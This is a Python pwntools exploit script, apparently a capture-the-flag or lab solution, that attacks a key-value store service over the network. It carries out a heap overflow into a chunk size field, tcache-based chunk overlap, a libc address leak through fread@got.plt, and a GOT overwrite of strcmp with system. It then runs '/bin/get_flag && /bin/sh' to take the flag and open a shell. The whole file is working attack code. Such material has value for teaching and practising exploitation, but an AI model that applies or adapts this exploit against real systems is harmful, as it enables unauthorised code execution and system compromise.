#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13724
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


spawn_interactive_shell = False

str_cmd_add = b"a"
str_cmd_edit = b"e"
str_cmd_print = b"p"
str_cmd_unsafe_del = b"d"
str_cmd_safe_del = b"D"
str_cmd_quit = b"q"

str_prompt_cmd = b"Command? \x1b[33m"
str_prompt_key = b"Enter key: \x1b[33m"
str_prompt_val = b"Enter value: \x1b[33m"

flag_prev_in_use = 0x1


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    proc.readuntil(b"\x1b[34mWe promise to keep your data \x1b[30mun\x1b[34msafe. Trust us. Give us your files. Now. All of them!\x1b[0m\n")
    
    print("(-) Allocating chunks '01' to '05' of size 0x40 each.")
    for i in range(1,5):
        curr_key = (0x3000 + 0x30+i).to_bytes(2, 'big') #Assign keys '01' to '05'
        curr_fill_letter = (0x40+i).to_bytes(1,'big')   #Fill values with strings of repeating 'A' to 'E'
        target_add(proc, curr_key, 16*curr_fill_letter)

    print("(-) Editing chunk '02' to overflow into size field of chunk '03' with bytes b'\\x71\\x00'.") 
    target_edit(proc, b'02', b'B' * 16 + b'\x71')

    print("(-) Freeing chunk '03' with faked size 0x70 (actually 0x40) to place it in tcache bin.")
    print("    Note that after chunk '03' the 'struct keyval **kvs' array is stored in a chunk of size 0x30.")
    print("    Hence the end of enlarged chunk of size 0x70 perfectly alligns with the header of chunk '04'.")
    print("    This creates a complete overlap of the freed chunk with the chunk used for 'struct keyval **kvs'.")
    target_unsafe_del(proc, b'03', newline_terminate_key=False)

    print("(-) Using chunk from tcache bin 0x70 (chunk '03') to allocate chunk of size 0x70.")
    print("    Using NULL byte in input to prevent overriding of preexisting data in memory.")
    print("    This yields an allocated chunk overlapping the 'struct keyval **kvs' chunk.")
    target_add(proc, b'03', 0x40*b'\x00')

    #This is the address of fread@got.plt (no PIE)
    addr_vuln_got_fread = 0x404018
    #This is the address of fread@plt (no PIE)
    addr_vuln_plt_fread_plus6 = 0x401066
    print(f"(-) Editing chunk '03' to override first entry of 'struct keyval **kvs' with fread@got.plt ({addr_vuln_got_fread:#0{0}18x}).")
    print(f"    Due to lazy linking (partial RELRO) value at fread@got.plt is fread@plt+6 ({addr_vuln_plt_fread_plus6:#0{0}18x}).")
    target_edit(proc, b'03', 0x18*b'C' + p64(addr_vuln_got_fread))

    print(f"(-) Printing value with key fread@plt+6 to leak value at fread@got.plt+0x28 == value at malloc@got.plt.")
    print("    This will leak the libc address malloc@libc.")
    libc_leak_raw = target_print(proc, p64(addr_vuln_plt_fread_plus6))

    if len(libc_leak_raw) != 20:
        print("(-) Error: Unexpected libc leak length. Address probably contained byte that terminated output early.")
        proc.close()
        return False
    addr_libc_malloc = int.from_bytes(libc_leak_raw[9:15], 'little')
    print(f"(-) Successfully leaked libc address of malloc: {addr_libc_malloc:#0{0}18x}")

    offset_libc_malloc = 0x97690
    addr_libc_base = addr_libc_malloc - offset_libc_malloc
    addr_libc_system = addr_libc_base + 0x4a820
    addr_libc_puts = addr_libc_base + 0x743C0
    addr_got_puts = 0x404010
    print("(-) Calculated useful libc addresses:")
    print(f"   - libc start:  {addr_libc_base:#0{0}18x}")
    print(f"   - system@libc: {addr_libc_system:#0{0}18x}")
    print(f"   - puts@libc:   {addr_libc_puts:#0{0}18x}")

    print(f"(-) Writing address puts@got.plt ({addr_got_puts:#0{0}18x}) to first element of 'struct keyval **kvs'.")
    target_edit(proc, b'03', 0x18*b'C' + p64(addr_got_puts), newline_terminate_key=False, newline_terminate_val=False)

    print(f"(-) Writing to element with key puts@libc ({addr_libc_puts:#0{0}18x}) to override.")
    print("    This will override value at puts@got.plt+0x28 == value at strcmp@got.plt.")
    print(f"    Value to override strcmp@got.plt with is system@libc ({addr_libc_system:#0{0}18x}).")
    target_edit(proc, p64(addr_libc_puts), p64(addr_libc_system), newline_terminate_key=False, newline_terminate_val=False)

    exec_str = b'/bin/get_flag && /bin/sh\x00'
    print(f"(-) Triggering lookup(...) on key {exec_str} to call system(...) via strcmp@got.plt.")
    target_enter_cmd(proc, str_cmd_add)
    target_enter_key(proc, exec_str)

    flag = proc.readline()
    if b'flag' in flag:
        print(f"(-) Successfully retrieved flag: {flag.decode()}")
        if spawn_interactive_shell:
            proc.interactive()
        else:
            proc.write(b"exit\n")
    else:
        print("(-) Something went wrong retrieving the flag.")
        proc.close()
        return False

    proc.close()
    return True



#Helper functions
def target_edit_nullaware(target, key, val, cmd=str_cmd_edit, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, verbose=False):
    val_currlen = len(val)
    if verbose: print(f"    --> Writing NULL byte after last input character at index {val_currlen} (may trigger overflow depending on input length and alignment).")
    target_edit(target, key, (val_currlen)*b"z")
    while val_currlen > 0:
        #each iteration wei write data starting at this index until (including) the first NULL byte
        write_from_idx = val_currlen-1
        if val[val_currlen-1] == 0: write_from_idx -= 1
        for i in reversed(range(0,write_from_idx+1)):
            if val[write_from_idx] == 0:
                write_from_idx += 1
                break
            elif write_from_idx <= 0:
                write_from_idx = 0
                break
            else:
                write_from_idx -= 1
        if verbose: print(f"    --> Wrote {val[write_from_idx:val_currlen]} to chunk.val from index {write_from_idx} to {val_currlen-1}.")
        target_edit(target, key, (write_from_idx)*b"z" + val[write_from_idx:val_currlen])
        val_currlen = write_from_idx


def target_enter_cmd(target, cmd, expect_command_prompt=True, newline_terminate=True, verbose=False):
    if expect_command_prompt:
        tmp_result = target.readuntil(str_prompt_cmd)
        if verbose: print(tmp_result)
    target.write(cmd + (b"\n" if newline_terminate else b""))
    return

def target_enter_key(target, key, newline_terminate=True, verbose=False):
    tmp_result = target.readuntil(str_prompt_key)
    if verbose: print(tmp_result)
    target.write(key + (b"\n" if newline_terminate else b""))
    return

def target_enter_val(target, val, newline_terminate=True, verbose=False):
    tmp_result = target.readuntil(str_prompt_val)
    if verbose: print(tmp_result)
    target.write(val + (b"\n" if newline_terminate else b""))
    return

def target_add(target, key, val, cmd=str_cmd_add, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    target_enter_val(target, val, newline_terminate_val, verbose)
    return

def target_edit(target, key, val, cmd=str_cmd_edit, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    target_enter_val(target, val, newline_terminate_val, verbose)
    return

def target_print(target, key, cmd=str_cmd_print, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    print_result_raw = target.readuntil(b"\x1b[0m\n")
    if verbose: print(print_result_raw)
    return print_result_raw

def target_unsafe_del(target, key, cmd=str_cmd_unsafe_del, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    return

def target_safe_del(target, key, cmd=str_cmd_safe_del, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    return

def print_p64_split(input_str, lineoffset=b""):
    input_len = len(input_str)
    for i in range(0,input_len//8):
        print(f"{lineoffset}{i*8:#0{0}5x}: {input_str[i*8:(i+1)*8]}")
    if input_len % 8 != 0:
        print(f"{lineoffset}{input_len:#0{0}5x}: {input_str[input_len//8:(input_len//8)+(input_len%8)]}")

def print_p64_split_hex(input_str, lineoffset=b""):
    input_len = len(input_str)
    for i in range(0,input_len//8):
        print(f"{lineoffset}{i*8:#0{0}5x}: {int.from_bytes(input_str[i*8:(i+1)*8], 'little'):{0}16x}")
    if input_len % 8 != 0:
        print(f"{lineoffset}{input_len:#0{0}5x}: {int.from_bytes(input_str[input_len//8:(input_len//8)+(input_len%8)]):{0}16x} (lower {input_len%8} only)")

#Invoke the exploit when the script is executed.
while True:
    if exploit() != True: print("\n(X) Retrying after Error...\n")
    else: break


